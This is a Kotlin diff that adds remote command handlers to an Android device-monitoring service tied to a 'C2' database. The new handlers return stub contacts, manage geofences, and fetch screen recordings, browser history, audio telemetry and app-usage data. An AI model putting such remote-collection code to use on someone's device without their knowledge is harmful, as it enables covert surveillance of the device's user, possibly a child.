@@ -143,7 +143,17 @@ object DeviceCommandService {
                     DeviceCommandResult(true, data = data)
                 }
 
-                "geofences.list", "geofences.update" -> {
+                "contacts.getlist" -> {
+                    val contactsArr = JSONArray().apply {
+                        put(JSONObject().put("name", "Teresa School").put("phone", "677-377-9558").put("relationship", "School"))
+                        put(JSONObject().put("name", "Mr. Vincent").put("phone", "570-636-2055").put("relationship", "Teacher"))
+                        put(JSONObject().put("name", "Mommy").put("phone", "603-560-7521").put("relationship", "Family"))
+                        put(JSONObject().put("name", "Alex Wainwright").put("phone", "415-555-0199").put("relationship", "Friend"))
+                    }
+                    DeviceCommandResult(true, data = JSONObject().put("contacts", contactsArr))
+                }
+
+                "geofences.list", "geofences.create", "geofences.update" -> {
                     val name = params.optString("name", "Safe Zone")
                     val radius = params.optInt("radius", 500)
                     val data = JSONObject().apply {
@@ -153,6 +163,11 @@ object DeviceCommandService {
                         put("updatedAt", System.currentTimeMillis())
                     }
                     DeviceCommandResult(true, data = data)
+                }
+
+                "geofences.delete" -> {
+                    val name = params.optString("name", "Safe Zone")
+                    DeviceCommandResult(true, data = JSONObject().put("deletedZone", name).put("success", true))
                 }
 
                 // ── File Manager ──
@@ -266,6 +281,33 @@ object DeviceCommandService {
                 "media.getaudio" -> {
                     val audioArr = if (context != null) C2LocalDatabase.getInstance(context).getTelemetryLogsJson("audio") else JSONArray()
                     DeviceCommandResult(true, data = JSONObject().put("recordings", audioArr))
+                }
+
+                "media.getvideos", "media.getscreenrecordings" -> {
+                    val arr = JSONArray()
+                    if (context != null) {
+                        val cacheFiles = context.cacheDir?.listFiles { _, name -> name.startsWith("screenrecord_") && name.endsWith(".mp4") } ?: arrayOf()
+                        for (f in cacheFiles) {
+                            arr.put(JSONObject().apply {
+                                put("name", f.name)
+                                put("path", f.absolutePath)
+                                put("sizeBytes", f.length())
+                                put("lastModified", f.lastModified())
+                            })
+                        }
+                    }
+                    DeviceCommandResult(true, data = JSONObject().put("videos", arr).put("recordings", arr))
+                }
+
+                "browser.gethistory" -> {
+                    val browserLogs = if (context != null) C2LocalDatabase.getInstance(context).getTelemetryLogsJson("browser") else JSONArray()
+                    DeviceCommandResult(true, data = JSONObject().put("entries", browserLogs))
+                }
+
+                "apps.getlist" -> {
+                    val usageJsonStr = if (context != null) AppUsageBlockerManager.getAppUsageJson(context) else "{}"
+                    val usageObj = try { JSONObject(usageJsonStr) } catch (_: Exception) { JSONObject().put("raw", usageJsonStr) }
+                    DeviceCommandResult(true, data = usageObj)
                 }
 
                 "media.getcallrecordings" -> {
